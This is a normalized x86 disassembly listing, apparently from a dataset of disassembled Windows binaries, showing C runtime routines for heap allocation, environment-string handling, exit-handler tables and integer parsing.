imul ecx [ ebp + 0x10 ]
shl esi 0x2
sub edi esi
cmp edi ecx
ja r-xdata
pop esi
pop ebp
retn
pop edi
lea eax [ ecx + esi ]
push 0x1
push eax
call sub_411ef8
push 0x0
mov esi eax
call sub_411e2d
add esp 0xc
mov eax esi
sub_411401
cmp [ rw-data ] 0x0
je r-xdata
push esi
push edi
call sub_416c32
call sub_417028
mov esi eax
test esi esi
jne r-xdata
xor eax eax
retn
push esi
call sub_41145a
pop ecx
test eax eax
jne r-xdata
or edi 0xffffffff
jmp r-xdata
push eax
mov ecx rw-data
mov [ rw-data ] eax
call sub_417cd5
xor edi edi
or edi 0xffffffff
jmp r-xdata
push esi
call sub_411e2d
pop ecx
mov eax edi
pop edi
pop esi
retn
push 0x0
call sub_411e2d
pop ecx
sub_41145a
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor edx edx
mov esi edi
mov al [ edi ]
jmp r-xdata
test al al
jne r-xdata
cmp al 0x3d
je r-xdata
lea eax [ edx + 0x1 ]
push 0x4
push eax
call sub_411ef8
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
mov ecx esi
lea ebx [ ecx + 0x1 ]
inc edx
xor ebx ebx
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx ebx
inc esi
add esi ecx
mov al [ esi ]
cmp [ edi ] 0x0
jne r-xdata
mov ecx edi
lea edx [ ecx + 0x1 ]
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
cmp [ edi ] 0x3d
lea eax [ ecx + 0x1 ]
mov [ ebp - 0x8 ] eax
je r-xdata
push 0x0
call sub_411e2d
pop ecx
pop edi
pop esi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
add edi eax
push 0x1
push eax
call sub_411ef8
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push ebx
call sub_41152b
push 0x0
call sub_411e2d
pop ecx
pop ecx
push edi
push [ ebp - 0x8 ]
push esi
call sub_411dd3
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_413537
int3
mov eax [ ebp - 0x4 ]
push 0x0
mov [ eax ] esi
add eax 0x4
mov [ ebp - 0x4 ] eax
call sub_411e2d
mov eax [ ebp - 0x8 ]
pop ecx
sub_41152b
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
push edi
mov edi esi
jmp r-xdata
test eax eax
jne r-xdata
push eax
call sub_411e2d
lea edi [ edi + 0x4 ]
mov eax [ edi ]
pop ecx
push esi
call sub_411e2d
pop ecx
pop edi
sub_41155a
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
push edi
lea edi [ esi + 0x4 ]
jmp r-xdata
cmp esi edi
jne r-xdata
mov ecx [ ebp + 0x8 ]
push esi
call [ r--data ]
call [ ebp + 0x8 ]
pop ecx
add esi 0x4
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40a8ab
mov esp ebp
pop ebp
retn 0x4
sub_4115d0
push sub_41159a
mov ecx rw-data
call sub_41155a
push sub_4115b5
mov ecx rw-data
call sub_41155a
push [ rw-data ]
call sub_41152b
push [ rw-data ]
call sub_41152b
pop ecx
pop ecx
retn
sub_41160c
mov edi edi
push ebx
push esi
call sub_416c32
mov esi [ rw-data ]
test esi esi
jne r-xdata
xor bl bl
mov esi rw-data
cmp al 0x22
jne r-xdata
test al al
je r-xdata
movsx eax al
push eax
call sub_416fbd
pop ecx
test eax eax
je r-xdata
test bl bl
sete bl
mov eax esi
pop esi
pop ebx
retn
test bl bl
je r-xdata
inc esi
jmp r-xdata
inc esi
mov al [ esi ]
test al al
jne r-xdata
mov al [ esi ]
cmp al 0x20
jg r-xdata
cmp al 0x20
jg r-xdata
inc esi
sub_41165f
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
sub eax esi
add eax 0x3
push edi
xor edi edi
shr eax 0x2
cmp [ ebp + 0xc ] esi
sbb ebx ebx
not ebx
and ebx eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40a8ab
mov esp ebp
pop ebp
retn
mov eax [ esi ]
mov [ ebp - 0x8 ] eax
test eax eax
je r-xdata
add esi 0x4
inc edi
cmp edi ebx
jne r-xdata
mov ecx eax
call [ r--data ]
call [ ebp - 0x8 ]
sub_4116bb
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ ebp + 0x8 ]
push edi
jmp r-xdata
cmp esi [ ebp + 0xc ]
jne r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
xor eax eax
add esi 0x4
mov ecx edi
call [ r--data ]
call edi
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40a8ab
mov esp ebp
pop ebp
retn
sub_411700
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x4000
je r-xdata
mov ecx rw-data
xchg [ ecx ] eax
xor eax eax
pop ebp
retn
cmp eax 0x8000
je r-xdata
cmp eax 0x10000
je r-xdata
call sub_4135e3
mov [ eax ] 0x16
call sub_413527
push 0x16
pop eax
pop ebp
retn
sub_411748
push 0x8
push r--data
call sub_40b2f0
mov esi rw-data
cmp [ rw-data ] esi
je r-xdata
call sub_40b336
retn
push 0x4
call sub_4129a2
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
push rw-data
call sub_417a5e
pop ecx
pop ecx
mov [ rw-data ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_411791
sub_41179a
mov edi edi
push ebp
mov ebp esp
push esi
call sub_41320e
mov edx [ ebp + 0x8 ]
mov esi eax
push 0x0
pop eax
mov ecx [ esi + 0x350 ]
test cl 0x2
sete al
inc eax
cmp edx 0xffffffff
je r-xdata
or [ rw-data ] 0xffffffff
test edx edx
je r-xdata
pop esi
pop ebp
retn
cmp edx 0x1
je r-xdata
or ecx 0x2
cmp edx 0x2
je r-xdata
and ecx 0xfffffffd
jmp r-xdata
call sub_4135e3
mov [ eax ] 0x16
call sub_413527
or eax 0xffffffff
jmp r-xdata
mov [ esi + 0x350 ] ecx
jmp r-xdata
sub_411802
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov ecx rw-data
xchg [ ecx ] eax
pop ebp
retn
cmp eax 0x1
je r-xdata
call sub_4135e3
mov [ eax ] 0x16
call sub_413527
or eax 0xffffffff
pop ebp
retn
sub_41183c
push 0xc
push r--data
call sub_40b2f0
and [ ebp - 0x1c ] 0x0
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_4129a2
pop ecx
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0xc ]
call sub_411a4e
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_411881
mov eax esi
call sub_40b336
retn 0xc
sub_41188d
push 0xc
push r--data
call sub_40b2f0
and [ ebp - 0x1c ] 0x0
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_4129a2
pop ecx
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0xc ]
call sub_41192e
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4118d2
mov eax esi
call sub_40b336
retn 0xc
sub_4118de
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_41188d
mov esp ebp
pop ebp
retn
sub_411906
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_41183c
mov esp ebp
pop ebp
retn
sub_41192e
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax ecx
mov [ ebp - 0x18 ] eax
push ebx
mov eax [ eax ]
mov ebx [ eax ]
test ebx ebx
jne r-xdata
mov edx [ rw-data ]
push esi
push edi
mov edi [ ebx ]
mov esi edx
mov ebx [ ebx + 0x4 ]
and esi 0x1f
xor edi edx
mov [ ebp - 0x14 ] esi
mov ecx esi
xor ebx edx
ror edi cl
ror ebx cl
test edi edi
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop edi
xor eax eax
pop esi
cmp edi 0xffffffff
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_40a8ab
mov esp ebp
pop ebp
retn
mov [ ebp - 0xc ] edi
mov [ ebp - 0x10 ] ebx
cmp edi 0xffffffff
je r-xdata
cmp [ ebx ] eax
je r-xdata
mov eax edx
xor edx edx
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
ror edx cl
mov ecx [ ebp - 0x18 ]
xor edx [ rw-data ]
mov eax [ ecx ]
mov eax [ eax ]
mov [ eax ] edx
mov eax [ ecx ]
mov eax [ eax ]
mov [ eax + 0x4 ] edx
mov eax [ ecx ]
mov eax [ eax ]
mov [ eax + 0x8 ] edx
push edi
call sub_411e2d
mov edx [ rw-data ]
pop ecx
sub ebx 0x4
cmp ebx edi
jb r-xdata
mov esi [ ebx ]
mov ecx [ ebp - 0x14 ]
xor esi edx
ror esi cl
mov ecx esi
mov [ ebx ] eax
call [ r--data ]
call esi
mov eax [ ebp - 0x18 ]
mov edx [ rw-data ]
mov esi edx
and esi 0x1f
mov [ ebp - 0x14 ] esi
mov eax [ eax ]
mov eax [ eax ]
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
xor ecx edx
mov [ ebp - 0x8 ] ecx
xor eax edx
mov ecx esi
ror [ ebp - 0x8 ] cl
ror eax cl
mov ecx [ ebp - 0x8 ]
cmp ecx [ ebp - 0xc ]
jne r-xdata
mov [ ebp - 0xc ] ecx
mov edi ecx
mov [ ebp - 0x10 ] eax
mov ebx eax
jmp r-xdata
push 0x20
pop ecx
cmp eax [ ebp - 0x10 ]
je r-xdata
push 0x20
pop ecx
sub ecx esi
xor eax eax
ror eax cl
xor eax edx
mov ecx [ ebp - 0x8 ]
sub_411a4e
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax ecx
mov [ ebp - 0x8 ] eax
push esi
mov eax [ eax ]
mov esi [ eax ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov ecx eax
push ebx
mov ebx [ esi ]
and ecx 0x1f
push edi
mov edi [ esi + 0x4 ]
xor ebx eax
mov esi [ esi + 0x8 ]
xor edi eax
xor esi eax
ror edi cl
ror esi cl
ror ebx cl
cmp edi esi
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push [ eax ]
call sub_40e244
push ebx
mov [ edi ] eax
call sub_40d5af
mov ebx [ ebp - 0x8 ]
mov ecx [ ebx ]
mov ecx [ ecx ]
mov [ ecx ] eax
lea eax [ edi + 0x4 ]
push eax
call sub_40d5af
mov ecx [ ebx ]
push esi
mov ecx [ ecx ]
mov [ ecx + 0x4 ] eax
call sub_40d5af
mov ecx [ ebx ]
add esp 0x10
mov ecx [ ecx ]
mov [ ecx + 0x8 ] eax
xor eax eax
sub esi ebx
mov eax 0x200
sar esi 0x2
cmp esi eax
ja r-xdata
pop esi
mov esp ebp
pop ebp
retn
lea edi [ eax + esi ]
test edi edi
jne r-xdata
mov eax esi
cmp edi esi
jb r-xdata
push 0x20
pop edi
push 0x4
lea edi [ esi + 0x4 ]
push edi
push ebx
call sub_417aae
push 0x0
mov [ ebp - 0x4 ] eax
call sub_411e2d
mov ecx [ ebp - 0x4 ]
add esp 0x10
test ecx ecx
jne r-xdata
push 0x4
push edi
push ebx
call sub_417aae
push 0x0
mov [ ebp - 0x4 ] eax
call sub_411e2d
mov ecx [ ebp - 0x4 ]
add esp 0x10
test ecx ecx
jne r-xdata
lea eax [ ecx + esi * 4 ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
lea esi [ ecx + edi * 4 ]
mov eax [ rw-data ]
mov edi [ ebp - 0x4 ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
xor eax eax
ror eax cl
mov ecx edi
xor eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov eax esi
sub eax edi
add eax 0x3
shr eax 0x2
cmp esi edi
sbb edx edx
not edx
and edx eax
mov [ ebp - 0x4 ] edx
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov edx [ ebp - 0xc ]
xor eax eax
pop edi
pop ebx
inc eax
mov [ ecx ] edx
lea ecx [ ecx + 0x4 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
sub_411ba5
mov edi edi
push ebp
mov ebp esp
push ecx
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x2
call sub_4118de
pop ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_411bc2
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
mov eax [ esi ]
cmp eax [ esi + 0x8 ]
jne r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
mov eax [ rw-data ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
xor eax eax
ror eax cl
xor eax [ rw-data ]
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop esi
pop ebp
retn
sub_411bff
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
push eax
push 0x2
call sub_411906
pop ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_411c57
mov eax [ rw-data ]
push esi
push 0x20
and eax 0x1f
xor esi esi
pop ecx
sub ecx eax
ror esi cl
xor esi [ rw-data ]
push esi
call sub_413498
push esi
call sub_410e40
push esi
call sub_417d45
push esi
call sub_411096
push esi
call sub_40e47e
add esp 0x14
mov al 0x1
pop esi
retn
sub_411c9d
mov eax [ rw-data ]
or ecx 0xffffffff
push esi
[ eax ] ecx
jne r-xdata
push [ rw-data ]
call sub_411e2d
push [ rw-data ]
xor esi esi
mov [ rw-data ] esi
call sub_411e2d
push [ rw-data ]
mov [ rw-data ] esi
call sub_411e2d
push [ rw-data ]
mov [ rw-data ] esi
call sub_411e2d
add esp 0x10
mov [ rw-data ] esi
mov al 0x1
pop esi
retn
mov eax [ rw-data ]
mov esi rw-data
cmp eax esi
je r-xdata
push eax
call sub_411e2d
pop ecx
mov [ rw-data ] esi
sub_411d38
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
and ecx 0xfff7ffff
and eax ecx
push esi
mov esi [ ebp + 0x8 ]
test eax 0xfcf0fce0
je r-xdata
push ecx
push [ ebp + 0xc ]
test esi esi
je r-xdata
test esi esi
je r-xdata
call sub_41811a
call sub_41811a
mov [ esi ] eax
jmp r-xdata
call sub_4135e3
push 0x16
pop esi
mov [ eax ] esi
call sub_413527
mov eax esi
jmp r-xdata
push 0x0
push 0x0
call sub_41811a
pop ecx
pop ecx
mov [ esi ] eax
pop ecx
pop ecx
xor eax eax
pop esi
pop ebp
retn
sub_411d97
push 0xc
push r--data
call sub_41d1f0
call sub_41320e
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
call sub_411eb5
and [ ebp - 0x4 ] 0x0
mov ecx esi
call [ r--data ]
call esi
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_411dd3
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
test edx edx
je r-xdata
call sub_4135e3
push 0x16
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
push edi
mov edi edx
sub esi edx
mov [ edx ] 0x0
pop edi
test ecx ecx
jne r-xdata
sub ecx 0x1
jne r-xdata
xor esi esi
jmp r-xdata
mov [ edx ] cl
call sub_4135e3
push 0x22
jmp r-xdata
mov al [ esi + edi ]
mov [ edi ] al
inc edi
test al al
je r-xdata
mov eax esi
pop esi
pop ebp
retn
pop esi
mov [ eax ] esi
call sub_413527
sub_411e2d
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
push esi
call sub_4135e3
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_41356a
pop ecx
mov [ esi ] eax
pop esi
sub_411e67
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0xffffffe0
ja r-xdata
call sub_4135e3
mov [ eax ] 0xc
xor eax eax
test esi esi
jne r-xdata
push esi
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
inc esi
jmp r-xdata
call sub_4117fc
test eax eax
je r-xdata
jmp r-xdata
push esi
call sub_410e54
pop ecx
test eax eax
je r-xdata
pop esi
pop ebp
retn
sub_411eb5
call sub_417d2e
test eax eax
je r-xdata
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_417d89
pop ecx
push 0x3
call sub_40e4ab
int3
push 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
push 0x1
push 0x40000015
push 0x3
call sub_41335d
add esp 0xc
push 0x7
pop ecx
int 0x29
sub_411ef8
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
imul esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push 0xffffffe0
xor edx edx
pop eax
div esi
cmp eax [ ebp + 0xc ]
jb r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
inc esi
jmp r-xdata
call sub_4135e3
mov [ eax ] 0xc
xor eax eax
call sub_4117fc
test eax eax
je r-xdata
jmp r-xdata
push esi
call sub_410e54
pop ecx
test eax eax
je r-xdata
pop esi
pop ebp
retn
sub_411f55
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test al 0x4
je r-xdata
test al 0x1
je r-xdata
mov al 0x1
pop ebp
retn
xor al al
pop ebp
retn
and eax 0x2
je r-xdata
test eax eax
jne r-xdata
cmp [ ebp + 0xc ] 0x80000000
ja r-xdata
cmp [ ebp + 0xc ] 0x7fffffff
ja r-xdata
sub_411f88
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
lea ecx [ ebp + 0xc ]
push ebx
push edi
call sub_4128e9
test al al
je r-xdata
xor ebx ebx
mov edi [ ebp + 0x14 ]
test edi edi
je r-xdata
pop edi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0xc ]
mov [ edx ] ecx
push esi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x28 ]
call sub_40ee04
mov eax [ ebp + 0xc ]
xor esi esi
mov [ ebp - 0xc ] esi
mov [ ebp - 0x18 ] eax
jmp r-xdata
cmp edi 0x2
jl r-xdata
mov bl [ eax ]
inc eax
mov [ ebp + 0xc ] eax
lea eax [ ebp - 0x24 ]
push eax
movzx eax bl
push 0x8
push eax
mov [ ebp - 0x4 ] bl
call sub_41292e
add esp 0xc
test eax eax
jne r-xdata
call sub_4135e3
mov [ eax ] 0x16
call sub_413527
cmp edi 0x24
jle r-xdata
mov eax [ ebp + 0xc ]
cmp [ ebp + 0x18 ] al
setne al
mov [ ebp - 0x8 ] eax
cmp bl 0x2d
jne r-xdata
cmp bl 0x2b
jne r-xdata
or eax 0x2
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov esi [ ebp + 0xc ]
mov esi [ ebp + 0xc ]
mov bl [ esi ]
inc esi
mov [ ebp - 0x4 ] bl
mov [ ebp + 0xc ] esi
jmp r-xdata
mov al bl
sub al 0x30
cmp al 0x9
ja r-xdata
cmp edi 0x10
jne r-xdata
test edi edi
je r-xdata
mov al bl
sub al 0x61
cmp al 0x19
ja r-xdata
movsx eax bl
add eax 0xffffffd0
jmp r-xdata
xor edx edx
or eax 0xffffffff
div edi
mov [ ebp - 0x14 ] edx
mov edx [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov al bl
sub al 0x41
cmp al 0x19
ja r-xdata
movsx eax bl
add eax 0xffffffa9
jmp r-xdata
test eax eax
je r-xdata
mov al bl
sub al 0x61
cmp al 0x19
ja r-xdata
movsx ecx bl
add ecx 0xffffffd0
jmp r-xdata
or eax 0xffffffff
movsx eax bl
add eax 0xffffffc9
jmp r-xdata
mov al [ esi ]
inc esi
mov [ ebp - 0x10 ] al
mov [ ebp + 0xc ] esi
cmp al 0x78
je r-xdata
test edi edi
jne r-xdata
mov al bl
sub al 0x41
cmp al 0x19
ja r-xdata
movsx ecx bl
add ecx 0xffffffa9
jmp r-xdata
cmp ecx 0xffffffff
je r-xdata
test edi edi
jne r-xdata
cmp al 0x58
je r-xdata
push 0xa
pop edi
jmp r-xdata
or ecx 0xffffffff
movsx ecx bl
add ecx 0xffffffc9
jmp r-xdata
push [ ebp - 0x4 ]
lea ecx [ ebp + 0xc ]
mov [ ebp - 0x8 ] edx
call sub_412895
mov ebx [ ebp - 0x8 ]
test bl 0x8
jne r-xdata
cmp ecx edi
jae r-xdata
mov bl [ esi ]
inc esi
mov [ ebp - 0x4 ] bl
mov [ ebp + 0xc ] esi
push 0x10
pop edi
test edi edi
jne r-xdata
mov esi [ ebp - 0xc ]
push esi
push ebx
call sub_411f55
pop ecx
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x18 ]
xor ebx ebx
mov [ ebp + 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
or edx 0x8
mov ebx [ ebp - 0x10 ]
cmp eax ebx
jb r-xdata
push [ ebp - 0x10 ]
lea ecx [ ebp + 0xc ]
call sub_412895
mov esi [ ebp + 0xc ]
jmp r-xdata
push 0x8
pop edi
test bl 0x2
je r-xdata
call sub_4135e3
mov [ eax ] 0x22
test bl 0x1
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
pop esi
je r-xdata
imul eax edi
add eax ecx
mov [ ebp - 0xc ] eax
jne r-xdata
mov ebx esi
neg esi
test bl 0x2
je r-xdata
or esi 0xffffffff
jmp r-xdata
mov edx [ ebp + 0x10 ]
test edx edx
je r-xdata
mov eax [ ebp - 0x28 ]
and [ eax + 0x350 ] 0xfffffffd
jmp r-xdata
lea ecx [ ebx - 0x30 ]
cmp cl 0x9
ja r-xdata
or edx 0x4
jmp r-xdata
cmp ecx [ ebp - 0x14 ]
jbe r-xdata
mov ebx 0x7fffffff
jmp r-xdata
mov ebx 0x80000000
jmp r-xdata
mov bl [ esi ]
inc esi
mov [ ebp - 0x4 ] bl
mov [ ebp + 0xc ] esi
jmp r-xdata
sub_4121b0
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
lea ecx [ ebp + 0xc ]
push ebx
push edi
call sub_4128e9
test al al
je r-xdata
xor ebx ebx
mov eax [ ebp + 0x14 ]
push 0x2
pop edi
test eax eax
je r-xdata
pop edi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0xc ]
mov [ edx ] ecx
push esi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x1c ]
call sub_40ee04
mov eax [ ebp + 0xc ]
xor esi esi
mov [ ebp - 0x8 ] esi
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp eax edi
jl r-xdata
movzx esi [ eax ]
add eax edi
push 0x8
push esi
mov [ ebp + 0xc ] eax
call sub_4184b5
pop ecx
pop ecx
test eax eax
jne r-xdata
call sub_4135e3
mov [ eax ] 0x16
call sub_413527
cmp eax 0x24
jle r-xdata
mov eax [ ebp + 0xc ]
xor ebx ebx
cmp [ ebp + 0x18 ] bl
setne bl
cmp si 0x2d
jne r-xdata
cmp si 0x2b
jne r-xdata
or ebx edi
jmp r-xdata
mov edi [ ebp + 0xc ]
mov edi [ ebp + 0xc ]
movzx esi [ edi ]
add edi 0x2
mov [ ebp + 0xc ] edi
jmp r-xdata
cmp si ax
jb r-xdata
cmp ecx edx
jne r-xdata
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x4 ] 0x19
push 0x30
pop eax
push 0x10
pop edx
test ecx ecx
je r-xdata
push 0x41
pop eax
cmp ax si
ja r-xdata
push 0x3a
pop eax
cmp si ax
jae r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x14 ]
mov ecx eax
lea eax [ esi - 0x61 ]
cmp ax [ ebp - 0x4 ]
ja r-xdata
push 0x5a
pop eax
cmp si ax
jbe r-xdata
mov eax 0xff10
cmp si ax
jae r-xdata
movzx eax si
sub eax 0x30
jmp r-xdata
push 0x41
pop eax
cmp ax si
ja r-xdata
push 0x3a
pop eax
cmp si ax
jae r-xdata
or eax 0xffffffff
lea eax [ esi - 0x61 ]
cmp ax [ ebp - 0x4 ]
movzx eax si
ja r-xdata
mov eax 0xff1a
cmp si ax
jae r-xdata
mov eax 0x660
cmp si ax
jb r-xdata
cmp eax 0xffffffff
jne r-xdata
lea eax [ esi - 0x61 ]
cmp ax [ ebp - 0x4 ]
ja r-xdata
push 0x5a
pop eax
cmp si ax
jbe r-xdata
mov eax 0xff10
cmp si ax
jae r-xdata
movzx eax si
sub eax 0x30
jmp r-xdata
movzx eax [ edi ]
add edi 0x2
mov [ ebp + 0xc ] edi
cmp eax 0x78
je r-xdata
test ecx ecx
jne r-xdata
add eax 0xffffffc9
jmp r-xdata
sub eax 0x20
or eax 0xffffffff
movzx eax si
sub eax 0xff10
jmp r-xdata
add eax 0xa
cmp si ax
jae r-xdata
test eax eax
je r-xdata
or eax 0xffffffff
lea eax [ esi - 0x61 ]
cmp ax [ ebp - 0x4 ]
movzx eax si
ja r-xdata
mov eax 0xff1a
cmp si ax
jae r-xdata
mov eax 0x660
cmp si ax
jb r-xdata
cmp eax 0xffffffff
jne r-xdata
test ecx ecx
jne r-xdata
cmp eax 0x58
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
mov eax 0x6f0
cmp si ax
jb r-xdata
movzx eax si
sub eax 0x660
jmp r-xdata
push esi
lea ecx [ ebp + 0xc ]
call sub_4128bd
test bl 0x8
jne r-xdata
cmp eax [ ebp + 0x14 ]
jae r-xdata
add eax 0xffffffc9
jmp r-xdata
sub eax 0x20
or eax 0xffffffff
movzx eax si
sub eax 0xff10
jmp r-xdata
add eax 0xa
cmp si ax
jae r-xdata
cmp eax 0xffffffff
je r-xdata
movzx esi [ edi ]
add edi 0x2
mov [ ebp + 0xc ] edi
mov [ ebp + 0x14 ] edx
test ecx ecx
jne r-xdata
add eax 0xa
cmp si ax
jae r-xdata
mov esi [ ebp - 0x8 ]
push esi
push ebx
call sub_411f55
pop ecx
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0xc ]
xor ebx ebx
mov [ ebp + 0xc ] eax
jmp r-xdata
mov esi [ ebp - 0x8 ]
or ebx 0x8
cmp esi ecx
jb r-xdata
mov eax 0x6f0
cmp si ax
jb r-xdata
movzx eax si
sub eax 0x660
jmp r-xdata
push eax
lea ecx [ ebp + 0xc ]
call sub_4128bd
mov edi [ ebp + 0xc ]
jmp r-xdata
mov [ ebp + 0x14 ] 0x8
mov eax 0x966
cmp si ax
jb r-xdata
movzx eax si
sub eax 0x6f0
jmp r-xdata
test bl 0x2
je r-xdata
call sub_4135e3
mov [ eax ] 0x22
test bl 0x1
jne r-xdata
cmp [ ebp - 0x10 ] 0x0
pop esi
je r-xdata
imul esi [ ebp + 0x14 ]
add esi eax
mov [ ebp - 0x8 ] esi
jne r-xdata
add eax 0xa
cmp si ax
jae r-xdata
add eax 0xa
cmp si ax
jae r-xdata
mov ebx esi
neg esi
test bl 0x2
je r-xdata
or esi 0xffffffff
jmp r-xdata
mov edx [ ebp + 0x10 ]
test edx edx
je r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x350 ] 0xfffffffd
jmp r-xdata
push 0x30
pop eax
cmp si ax
jb r-xdata
or ebx 0x4
jmp r-xdata
cmp eax edx
jbe r-xdata
mov eax 0x966
cmp si ax
jb r-xdata
movzx eax si
sub eax 0x6f0
jmp r-xdata
mov eax 0x9e6
cmp si ax
jb r-xdata
movzx eax si
sub eax 0x966
jmp r-xdata
mov ebx 0x7fffffff
jmp r-xdata
mov ebx 0x80000000
jmp r-xdata
movzx esi [ edi ]
add edi 0x2
mov [ ebp + 0xc ] edi
jmp r-xdata
add eax 0xa
cmp si ax
jae r-xdata
add eax 0xa
cmp si ax
jae r-xdata
mov eax 0x9e6
cmp si ax
jb r-xdata
movzx eax si
sub eax 0x966
jmp r-xdata
mov eax 0xa66
cmp si ax
